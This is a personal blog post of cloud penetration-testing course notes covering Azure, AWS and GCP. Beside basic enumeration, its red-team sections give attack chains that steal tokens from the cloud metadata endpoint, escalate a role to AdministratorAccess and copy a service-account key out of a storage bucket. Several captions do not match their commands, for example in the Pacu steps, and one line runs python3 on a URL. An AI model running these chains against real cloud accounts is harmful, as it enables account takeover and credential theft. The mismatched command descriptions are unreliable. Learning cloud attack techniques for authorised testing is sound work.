---
title: "Intro to Cloud Pentesting!"
classes: wide
header:  
  teaser: /assets/images/posts/cloud/cloud-teaser1.jpg
  overlay_image: /assets/images/main/header6.jpg
  overlay_filter: 0.5
ribbon: Firebrick
excerpt: "The basics of Cloud Pentesting."
description: "Wanna learn Cloud Pentesting? Start here!"
categories:
  - notes
  - cloud
tags:
  - beginner
  - Cloud
  - AWS 
  - Azure
  - GCP
toc: false
---


***Hi Guys! enough is enough...***

***I'm going strong with Cloud this Year! And I mean it.*** 😈 ***I'll do every course and certification of Cloud imaginable to mankind. And u'll get the best of it.***

> *My main focus will be in this order - Azure > AWS > GCP*

***anyway... Lets start looking at main components and commands of Cloud Pentesting!***

<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #121212;
            color: #ffffff;
            margin: 0;
            padding: 0;
        }
        .tab-container {
            display: flex;
            border-bottom: 1px solid #333;
            background-color: #1e1e1e;
        }
        .tab {
            padding: 10px 20px;
            cursor: pointer;
            background: #1e1e1e;
            border: 1px solid #333;
            border-bottom: none;
            margin-right: -1px;
            color: #bbb;
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
            transition: background 0.3s, color 0.3s;
        }
        .tab:hover {
            background: #292929;
        }
        .tab.active {
            background: #333;
            border-top: 2px solid #007bff;
            color: #fff;
        }
        .tab-content {
            border: 1px solid #333;
            padding: 20px;
            display: none;
            background-color: #1e1e1e;
            border-bottom-left-radius: 10px;
            border-bottom-right-radius: 10px;
            transition: opacity 0.3s ease-in-out;
            opacity: 0;
        }
        .tab-content.active {
            display: block;
            opacity: 1;
        }
    </style>
</head>
<body>

<div class="tab-container">
    <div class="tab active" onclick="showTabContent(event, 'az')">Azure</div>
    <div class="tab" onclick="showTabContent(event, 'aws')">AWS</div>
    <div class="tab" onclick="showTabContent(event, 'gcp')">GCP</div>
</div>

<div id="az" class="tab-content active" markdown="1">



# Azure

1. Intro to Azure 
2. Authentication Methods
3. CLI Based Enumeration
4. Red Team Ops in Azure 


## **Intro to Azure**
   
> Microsoft Azure, commonly referred to as Azure, is a cloud computing service created by Microsoft for building, testing, deploying, and managing applications and services through Microsoft-managed data centers.

### **3 Main Components of Azure:**
- Azure Active Directory (AAD)
- Azure Resource Manager (ARM)
- Office 365 (O365)
     
     
**Azure Active Directory (AAD)**
- Azure Active Directory (Azure AD) is Microsoft's cloud-based identity and access management service, which helps the employees sign in and access resources in the cloud and on-premise.
**Azure Resource Manager (ARM)**
- Azure Resource Manager (ARM) is the native platform for infrastructure as code (IaC) in Azure. It enables you to centralize the management, deployment, and security of Azure resources.
**Office 365 (O365)**
- Office 365 is a cloud-based suite of productivity and collaboration apps.

## **Authentication Methods**

### *Short Term Credential:*
- AAD Username & Password
- SSO Username & Password OAuth Access Token

### *Long Term Credential:*
- Username & Password
- Client ID & Secret / Certificate

## **CLI Based Enumeration**

*Enumeration: Entra ID / Azure AD*

Check if the target organization is using Entra ID as an Identity Provider (IDP):
```powershell
https://login.microsoftonline.com/getuserrealm.srf?login=Username@DomainName&xml=1
```

   
**Enumeration: Azure Resource Manager**

Lists various commands for enumeration in Azure Resource Manager:
```powershell
az account show
az account list --all
az role assignment list --assignee ObjectID/Sign-InEmail/ServicePrincipal --all
az role definition list --custom-role-only
```


## **Red Team Ops in Azure**

Log in to Azure CLI with Initial Compromised User Credential:
```powershell
az login
```

Get details about currently logged-in session:
```powershell
az account list
```

Log in to Mg Graph PowerShell CLI with Initial Compromised User Credential:
```powershell
Connect-MgGraph -Scopes "Directory.Read.All"
```

Get currently logged-in session information:
```powershell
Get-MgContext
```

Get access token with Az CLI:
```powershell
az account get-access-token --resource https://graph.microsoft.com
```

Log in to Mg Graph PowerShell CLI with access token:
```powershell
Connect-MgGraph -AccessToken [TOKEN]
```

Get the User ID of the "auditor" user:
```powershell
Get-MgUser -Filter "startswith(displayName,'auditor')"
```

List all objects owned by the logged-in user:
```powershell
Get-MgUserOwnedObject -UserId [UserID] | ConvertTo-Json
```

Get an application object id & app id:
```powershell
Get-MgApplication -Filter "startswith(displayName,'prod-app')"
```

Get details about the owner of the specified applications:
```powershell
Get-MgApplicationOwner -ApplicationId "AppObjectID" | ConvertTo-Json
```

Check the directory role assigned to the prod application:
```powershell
Add-MgApplicationPassword -ApplicationId "AppObjectID" | ConvertTo-Json
```

Get all the role assignments "auditor" user has on Azure subscription (ARM: Azure Resource Manager):
```powershell
az role assignment list --assignee 'auditor@domain.com' --all
```

Get the list of all available subscriptions:
```powershell
az vm list
```

Enumerate VM Instance and its public IP address:
```powershell
az vm list-ip-addresses --name prod-vm --resource-group PROD-RG
```

Exploit a public-facing application and retrieve the access token of managed identity attached to VM:
```powershell
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

Configure access token in Az PowerShell CLI:
```powershell
$token = "AccessToken"
```

Connect to Az Account using Access Token:
```powershell
Connect-AzAccount -AccessToken $token -AccountId [Subscription ID]
```

Check the role assignment of managed identity attached to VM:
```powershell
Get-AzRoleAssignment -ObjectId [PrincipalID-ManagedIdentity]
```


</div>

<div id="aws" class="tab-content" markdown="1">



# AWS

1. Introduction to AWS 
2. Authentication Methods
3. CLI Based Enumeration
4. Red Team Ops in AWS 

## Intro to AWS

### SDK/API

- AWS CLI
- GUI Storage
- Compute
- Control Plane
- AWS Services
- Data Plane
- Cloud Space
- Web Client
- End User

### AWS Web Portal

- IAM Username & Password
- SSO Username & Password
- Long Term Key: Access Key ID & Secret
- Short Term Key: Access Key ID & Secret & Token

#### AWS Architecture

- AWS services
- Compute
- Storage
- Access Management
- Identity
- Networking
- VPC
- Security
- Cloud Trail
- Guard duty
- IAM
- SSO
- EC2 Lambda ECS / EKS
- S3
- RDS
- EBS
- IAM
- CloudWatch


#### Identity and Access Management

##### IAM

AWS Identity and Access Management (IAM) enables you to manage access to AWS services and resources securely. IAM allows you to create and manage AWS users and groups and use permissions to allow and deny their access to AWS resources.

**AWS IAM allows:**
1. Manage IAM users, groups, and their access.
2. Manage IAM roles and their permissions.
3. Manage federated users and their permissions.

##### IAM Groups, Users, Roles, Actions, Policy

- Policy Contains Permissions
- Policy Attached to User
- Policy Attached to Roles
- Policy Attached to Groups
- Role Attached to Services
- Effect Resources

**Users**

An AWS Identity and Access Management (IAM) user is an entity that you create in AWS to represent the person or application that uses it to interact with AWS. A user in AWS consists of a name and credentials.

**Groups**

An IAM group is a collection of IAM users. Groups let you specify permissions for multiple users, which can make it easier to manage the permissions for those users.

**Roles**

An IAM role is an IAM entity that defines a set of permissions for making AWS service requests. IAM roles are associated with AWS services such as EC2, RDS, etc.

**Role for EC2 services IAM**

- EC2 S3
- Role Attach to EC2 Instance
- Full permission
- EC2 Instance can access S3 Bucket

> IAM Role has a trusted entity to EC2. So EC2 can assume this role.

**Policies**

IAM policies define permissions for an action to perform the operation. For example, if a policy allows the GetUser action, then a user with that policy can get user information from the AWS Management Console, the AWS CLI, or the AWS API. Policies can be attached to IAM identities (users, groups, or roles) or AWS resources.

**Policy Data:**

- Effect - Use to Allow or Deny Access
- Action - Include a list of actions (Get, Put, Delete) that the policy allows or denies.
- Resource - A list of resources to which the actions apply

**Policy types:**

- Inline Policies - An inline policy is a policy that's embedded in an IAM identity (a user, group, or role)
- Managed Policies
  - AWS Managed Policies
  - Customer Managed Policies

## Authentication Methods

**Short Term Credential:**

- AAD Username & Password
- SSO Username & Password OAuth Access Token

**Long Term Credential:**

- Username & Password
- Client ID & Secret / Certificate

**Credentials Programmatic Interface (CLI/ SDK):**

- Programmatic Interface (CLI/ SDK)
- Graphical User Interface (GUI)
- IAM Username & Password
- SSO Username & Password
- Access Key ID
- Secret Access Key
- Session Token
- Access Key ID
- Secret Access Key

### AWS Cloud Authentication

#### Authentication to AWS Management Portal

**IAM Root User’s credential [Username + Password] - Long Term Access**

[https://console.aws.amazon.com/](https://console.aws.amazon.com/)

**IAM User’s credential [Username + Password] - Long Term Access**

[https://console.aws.amazon.com/](https://console.aws.amazon.com/)

**SSO User’s credential [Username + Password] - Long Term Access**

[https://Org-Name.awsapps.com/start](https://Org-Name.awsapps.com/start)

#### Authentication to AWS using AWS CLI

**Long Term: Access Key ID + Access Key Secret**
```shell
aws configure --profile profile-name
```

Programmatic Access (Access Key ID + Access Key Secret)
```shell
aws sts get-caller-identity --profile profile-name
```

Get the information about configured identity.
```shell
aws configure
```

Programmatic Access (Access Key ID + Access Key Secret + Session Token)
```shell
aws sts get-caller-identity --profile profile-name
```
Get the information about configured identity.

**Windows**
```powershell
C:\Users\UserName\.aws
```
*AWS CLI Stored Credentials*

**Linux**
```shell
/home/UserName/.aws
```
AWS CLI Stored Credentials:
```shell
cat credentials
```
*Content of credentials file.*

## Enumeration

List the IAM groups that the specified IAM user belongs to:
```shell
aws iam list-groups-for-user --user-name [user-name]
```

List of IAM Users:
```bash
aws iam list-users
```

List all manages policies that are attached to the specified IAM user:
```bash
aws iam list-attached-user-policies --user-name [user-name]
```

Lists the names of the inline policies embedded in the specified IAM user:
```bash
aws iam list-user-policies --user-name [user-name]
```

List of IAM Groups:
```bash
aws iam list-groups
```

List of all users in a group:
```bash
aws iam get-group --group-name [group-name]
```

Lists all managed policies that are attached to the specified IAM Group:
```bash
aws iam list-attached-group-policies --group-name [group-name]
```

List the names of the inline policies embedded in the specified IAM Group:
```bash
aws iam list-group-policies --group-name [group-name]
```

List of IAM Roles:
```bash
aws iam list-roles
```

Lists all managed policies that are attached to the specified IAM role:
```bash
aws iam list-attached-role-policies --role-name [role-name]
```

List the names of the inline policies embedded in the specified IAM role:
```bash
aws iam list-role-policies --role-name [role-name]
```

List of all IAM policies:
```bash
aws iam list-policies
```

Retrieves information about the specified managed policy:
```bash
aws iam get-policy --policy-arn [policy-arn]
```

Lists information about the versions of the specified managed policy:
```bash
aws iam list-policy-versions --policy-arn [policy-arn]
```

Retrieved information about the specified version of the specified managed policy:
```bash
aws iam get-policy-version --policy-arn [policy-arn] --version-id [version-id]
```

Retrieves the specified inline policy document that is embedded in the specified IAM user:
```bash
aws iam get-user-policy --user-name [user-name] --policy-name [policy-name]
```

Retrieves the specified inline policy document that is embedded in the specified IAM group:
```bash
aws iam get-group-policy --group-name [group-name] --policy-name [policy-name]
```

Retrieves the specified inline policy document that is embedded in the specified IAM role:
```bash
aws iam get-role-policy --role-name [role-name] --policy-name [policy-name]
```

## Red Team Ops in AWS

### Cloud Red Team Attack Life Cycle

Configure Initial Compromised User Credential:
```bash
aws configure --profile auditor
```

Enumerate Cloud Services, e.g., EC2, S3, etc., in an Organization AWS Account:
```bash
aws ec2 describe-instances --profile auditor
```

Exploit Public Facing Application Running on EC2 Instance and Retrieve Temporary Credential:
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/jump-ec2-role
```

> [Note] Cloud meta-data can be retrieved by exploiting these web app vulnerabilities:
> - SSRF
> - RCE

Configure & Validate Temporary Credential in AWS CLI:
```bash
aws configure set aws_access_key_id [key-id] --profile ec2
aws configure set aws_secret_access_key [key-id] --profile ec2
aws configure set aws_session_token [token] --profile ec2
aws sts get-caller-identity --profile ec2
```

Retrieves the specified inline policy document that is embedded in the EC2 instance role:
```bash
aws iam list-attached-role-policies --role-name jump-ec2-role --profile auditor
aws iam list-role-policies --role-name jump-ec2-role --profile auditor
```

Get the Managed Policy Attached to EC2 Instance:
```bash
aws iam get-role-policy --role-name jump-ec2-role --policy-name jump-inline-policy --profile auditor
```

Get the permissions in inline policy:
```bash
aws iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --role-name jump-ec2-role --profile ec2
```


Escalate privilege by attaching administrator policy to itself:
```bash
aws iam list-attached-role-policies --role-name jump-ec2-role --profile auditor
```

>  check the managed Policy Attached to EC2 Instance.

### **Red Team Ops with PACU:**

[PACU Github](https://github.com/RhinoSecurityLabs/pacu)

Setting the initial user access key in pacu:
```bash
set_keys
exec iam__enum_permissions
whoami
```

Get the permission of the current logged-in user:
```bash
exec ec2__enum
data EC2
```

Enumerate EC2 instance and get the public IP addresses:
```bash
set_keys
exec iam__enum_permissions
whoami
```

Set the temporary credential for role attached to EC2 instance:
```bash
exec iam__privesc_scan
```

Enumerate privilege escalation permission and exploit it:
```bash
exec iam__enum_permissions
whoami
```

> Check the permission of the privilege escalated role.

</div>

<div id="gcp" class="tab-content" markdown="1">



# GCP

1. Introduction to Google Cloud
2. Authentication Methods
3. CLI Based Enumeration
4. Red Team Ops in Google Cloud

## Intro to Google Cloud

### Main Components

- Cloud Identity
- Google Workspace (G Suite)
- Google Cloud Platform (GCP)

#### Google Cloud Overview

**Cloud Identity:**

- Identity Provider
- Cloud Identity is an Identity as a Service (IDaaS) solution that centrally manages users and groups.
- Configure Cloud Identity to federate identities between Google and other identity providers, such as Active Directory and Azure Active Directory.
- Cloud Identity API: [https://cloudidentity.googleapis.com](https://cloudidentity.googleapis.com)
- Organization Admin [Gcloud Role]

#### Cloud Identity

**Google Workspace (G Suite):**

- Identity Provider
- Google Workspace includes an inbuilt IDaaS solution for accessing SAAS Applications and GCP Resources.
- Collaboration SAAS Applications like Gmail, Calendar, Meet, Chat, Drive, Docs, Sheets, Slides, Forms, Sites, and more.
- [Google Workspace API](https://www.googleapis.com/)
- [Mail API](https://mail.googleapis.com/*)
- [Drive API](https://drive.googleapis.com/*)
- [Calendar API](https://calendar.googleapis.com/*)

#### Google Workspace

**Google Cloud Platform (GCP):**

- Suite of cloud computing services running on the same infrastructure as Google's internal products.
- Regions: Independent geographic areas consisting of zones. There are around 24 regions in Google Cloud.

#### Google Cloud Platform

**Google Cloud Space:**
- GCP Portal
- Google Cloud API
- Web Client
- Gcloud CLI
- API Client

**Authentication:**
- API Key
- OAuth Access Token
- Username & Password (Gmail, G Suite, or Cloud Identity)
- Service Account JSON File

### GCP Architecture

- Cloud Identity
- Google Cloud Platform
- Google Workspace

**Identify Access Management:**
- User
- Group
- Devices
- Administrator
- Roles
- IAM & Admin

**Compute:**
- Compute Engine
- GKE
- Cloud Function

**Storage:**
- Cloud Storage
- Persistent Disk

**Networking:**
- VPC

**Identity:**
- User, Group & Devices
- Admin Roles

**SAAS:**
- Apps Mail
- Docs, Meet, etc.

### Google Cloud Services

**Company Structure:**
- Dept X
- Dept Y
- Shared Infrastructure
- Team A
- Team B

**Projects:**
- Dev GCP Project
- Test GCP Project
- Production GCP Project

**Resources:**
- App Engine
- Cloud Storage Buckets
- Compute Engine Instances
- Organization
- Folders
- Projects
- Resources

### GCP Resources Hierarchy

**Service Account:**
- A service account represents a non-human user that needs to authenticate and be authorized to access data in Google APIs.
- Types of service accounts:
  - User-managed service accounts
  - Default service accounts

**Service Account Credential (Key):**
- IAM lets administrators authorize who can take action on specific resources, giving full control and visibility to manage Google Cloud resources centrally.
- IAM follows resource-based policy instead of identity-based policy.
- IAM policies are attached to resources, not identities.

#### Cloud IAM (Identity & Access Management)

**IAM Role Binding:**
- Organization Level
- Project Level
- Resource Level

**Identity (Members):**
- Google Account
- Service Account
- Google Group
- Google Workspace Domain
- Cloud Identity Domain
- All authenticated users
- All users

**Roles:**
- Basic roles: Owner, Editor, Viewer
- Predefined roles: Finer-grained access control than basic roles
- Custom roles: Tailored permissions for specific needs
- Roles are specified in the form of roles/service.roleName

**IAM Policy Structure:**
```json
{
  "bindings": [
    {
      "role": "roles/storage.objectAdmin",
      "members": [
        "user:user1@example.com",
        "user:user2@example.com",
        "serviceAccount:my-other-app@appspot.gserviceaccount.com",
        "group:admins@example.com",
        "domain:google.com"
      ]
    },
    {
      "role": "roles/storage.objectViewer",
      "members": [
        "user:user3@example.com"
      ]
    }
  ]
}
```

## Authentication Methods

- Short Term Credential
- Long Term Credential
- Programmatic Interface (CLI/ SDK/ API)
- Graphical User Interface (GUI)

### Google Cloud Authentication Credential

**Login with User Account (Username + Password)**

- GCP Console Access
- CLI Access: `gcloud auth login`

**Retrieve authenticated accounts:**
```shell
gcloud auth list
```

**Login with Service Account (App ID + JSON Key File)**
```shell
gcloud auth activate-service-account --key-file KeyFile
```

**Retrieve authenticated accounts:**
```shell
gcloud auth list
```

**Stored Credentials Locations:**
- **Windows:** `C:\Users\UserName\AppData\Roaming\gcloud\`
- **Linux:** `/home/UserName/.config/gcloud/`

**Database:**
- `access_tokens.db` (Columns: account_id, access_token, token_expiry, rapt_token)
- `credentials.db` (Columns: account_id, value)

## CLI Based Enumeration

```shell
gcloud auth list
```

**Retrieve Google Cloud CLI Configuration:**
```shell
gcloud config list
```

**Organizations:**
- List organizations: `gcloud organizations list`
- Retrieve IAM policy for an organization: `gcloud organizations get-iam-policy [OrganizationID]`

**Projects:**
- List projects: `gcloud projects list`
- Retrieve IAM policy for a project: `gcloud projects get-iam-policy [ProjectID]`

**Service Accounts:**
- List service accounts: `gcloud iam service-accounts list`
- Retrieve IAM policy for a service account: `gcloud iam service-accounts get-iam-policy [Service Account Email ID]`
- List service account keys: `gcloud iam service-accounts keys list --iam-account [Service Account Email ID]`

**Roles:**
- List roles: `gcloud iam roles list`
- Retrieve permissions for a role: `gcloud iam roles describe [roles/owner]`

**Custom Roles:**
- List roles in a project: `gcloud iam roles list --project [ProjectID]`
- Retrieve permissions for a custom role: `gcloud iam roles describe [RoleName] --project [ProjectID]`

## Red Team Ops in GCP

**Configure Initial Compromised Service Account Credential:**
```bash
gcloud auth activate-service-account --key-file alert-nimbus-335411-4ee19bc40a65.json
```

**Enumerate Cloud Services:**
```bash
gcloud projects get-iam-policy alert-nimbus-335411
gcloud projects get-iam-policy alert-nimbus-335411 --flatten="bindings[].members" --filter="bindings.members=serviceaccount:auditor@alert-nimbus-335411.iam.gserviceaccount.com" --format="value(bindings.role)"
gcloud compute instances list
```

**Exploit Public Facing Application:**
```bash
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/233003792018-compute@developer.gserviceaccount.com/token
```

**Save and Validate Access Token:**
```bash
gcloud projects list --access-token-file token.txt
```

**Retrieve IAM Policy for Service Account Attached to Compute Instance:**
```bash
gcloud projects get-iam-policy alert-nimbus-335411
gcloud projects get-iam-policy alert-nimbus-335411 --flatten="bindings[].members" --filter="bindings.members=serviceaccount:233003792018-compute@developer.gserviceaccount.com" --format="value(bindings.role)"
```

**Exfiltrate Credentials:**
```bash
gcloud storage ls --access-token-file token.txt
gcloud storage ls gs://devops-storage-metatech --access-token-file token.txt
gcloud storage cp gs://devops-storage-metatech/devops-srvacc-key.json . --access-token-file token.txt
```

**Authenticate with New Service Account Key and Retrieve IAM Policy:**
```bash
gcloud auth activate-service-account --key-file devops-srvacc-key.json
gcloud projects get-iam-policy alert-nimbus-335411 --flatten="bindings[].members" --filter="bindings.members=serviceaccount:devops-service-account@alert-nimbus-335411.iam.gserviceaccount.com" --format="value(bindings.role)"
```

### **Where dafuck is the GCP Tools:**

> Dont worry we'll find more or create other tools 

```bash
./gcp_enum.sh
```

- Perform authenticated enumeration using "gcp_enum" script: [GCP Enum Script](https://gitlab.com/gitlab-com/gl-security/threatmanagement/redteam/redteam-public/gcp_enum)
- Identify possible privilege escalation methods:

```bash
python3 http://privescscanner/enumerate_member_permissions.py -p alert-nimbus-335411
python3 http://privescscanner/check_for_privesc.py
python3 ExploitScripts/iam.roles.update.py
```

- Exploit identified misconfigured IAM permissions for privilege escalation: [GitHub - GCP IAM Privilege Escalation](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation)

</div>

<script>
    function showTabContent(event, tabId) {
        // Hide all tab contents
        var tabContents = document.querySelectorAll('.tab-content');
        tabContents.forEach(function(content) {
            content.classList.remove('active');
        });

        // Remove active class from all tabs
        var tabs = document.querySelectorAll('.tab');
        tabs.forEach(function(tab) {
            tab.classList.remove('active');
        });

        // Show the selected tab content
        document.getElementById(tabId).classList.add('active');

        // Add active class to the clicked tab
        event.currentTarget.classList.add('active');
    }
</script>

</body>
</html>

---

*We'll see the particularities of each one later*
*;)*


> This is my notes of the *Multi-Cloud Red Team Analyst (MCRTA)* from [CWL](https://cyberwarfare.live). Check their content.

---

Before ending the post, I did a table of courses/certification about Cloud Pentesting. So if you are interested in this path, you can search for the following:

## CLOUD PENTESTING TRAINING

| Category    | Course                                    | Link                                                                                  | Price  |
|-------------|-------------------------------------------|---------------------------------------------------------------------------------------|--------|
| AZURE   | CARTP                                     | [AzureADLab](https://www.alteredsecurity.com/azureadlab)                              | $449   |
|             | CARTE                                     | [AzureAdvanced](https://www.alteredsecurity.com/azureadvanced)                        | $499   |
|             | OASP                                      | [BreachingAzure](https://cloudbreach.io/breachingazure/#oasp)                         | $499   |
|             | XINTRA Azure course                       | [Attacking and Defending Azure M365](https://training.xintra.org/attacking-and-defending-azure-m365) | $1550  |
|             | White Knight Labs | [Offensive Azure Operations and Tactics](https://training.whiteknightlabs.com/offensive-azure-operations-tactics/) | $700 |
|             | Pwned Labs | [𝗠𝗶𝗰𝗿𝗼𝘀𝗼𝗳𝘁 𝗖𝗹𝗼𝘂𝗱 𝗥𝗲𝗱 𝗧𝗲𝗮𝗺 𝗣𝗿𝗼𝗳𝗲𝘀𝘀𝗶𝗼𝗻𝗮𝗹 (𝗠𝗖𝗥𝗧𝗣)](https://bootcamps.pwnedlabs.io/mcrtp-bootcamp) | $349 |
| AWS   | OAWSP                                     | [BreachingAWS](https://cloudbreach.io/breachingaws/#oawsp)                            | $599   |
|             | CARTS                                     | [AWS Cloud Red Team Specialist (CARTS)](https://cyberwarfare.live/product/aws-cloud-red-team-specialist-carts/) | $599   |
|             | ARTE                              | [Hacktricks AWS Red Team Expert](https://training.hacktricks.xyz/courses/arte) | 1099€      |
| GCP     | CGRTS                                     | [Google Cloud Red Team Specialist (CGRTS)](https://cyberwarfare.live/product/google-cloud-red-team-specialist-cgrts/) | $599   |
|             | GRTE                              | [Hacktricks GCP Red Team Expert](https://training.hacktricks.xyz/courses/grte) | 1099€      |
| KUBERNETES | Hacking Kubernetes                    | [Hacking and Securing Kubernetes Clusters](https://www.theoffensivelabs.com/p/hacking-and-securing-kubernetes-clusters) | $178   |
|             | Kubernetes Course                         | [Kubernetes Goat](https://madhuakula.com/kubernetes-goat/)                            | -   |
| EXTRA   | SANS Cloud Pentesting                     | [Cloud Penetration Testing](https://www.sans.org/cyber-security-courses/cloud-penetration-testing/) | $8525  |
|             | AntiSyphon Cloud Training                 | [Breaching the Cloud](https://www.antisyphontraining.com/event/breaching-the-cloud-w-beau-bullock-3/) | $575   |
|             | CCSP                                      | [Certified Cloud Security Professional](https://www.isc2.org/certifications/ccsp)     | $8140  |
| OFICIAIS| Az900                                     | [Azure Fundamentals](https://learn.microsoft.com/pt-br/credentials/certifications/azure-fundamentals/?practice-assessment-type=certification) | -      |
|             | Az500                                     | [Azure Security Engineer](https://learn.microsoft.com/pt-br/credentials/certifications/azure-security-engineer/?practice-assessment-type=certification) | -      |
|             | AWS Security                              | [AWS Certified Security – Specialty](https://aws.amazon.com/pt/certification/certified-security-specialty/) | -      |
|             | AWS Administrator                         | [AWS Certified SysOps Administrator – Associate](https://aws.amazon.com/pt/certification/certified-sysops-admin-associate/) | -      |
|             | GCP Security                              | [Google Cloud Certified - Professional Cloud Security Engineer](https://cloud.google.com/learn/certification/cloud-security-engineer?hl=pt-br) | -      |
|             | GCP Engineer                              | [Google Cloud Certified - Associate Cloud Engineer](https://cloud.google.com/learn/certification/cloud-engineer?hl=pt-br) | -      |


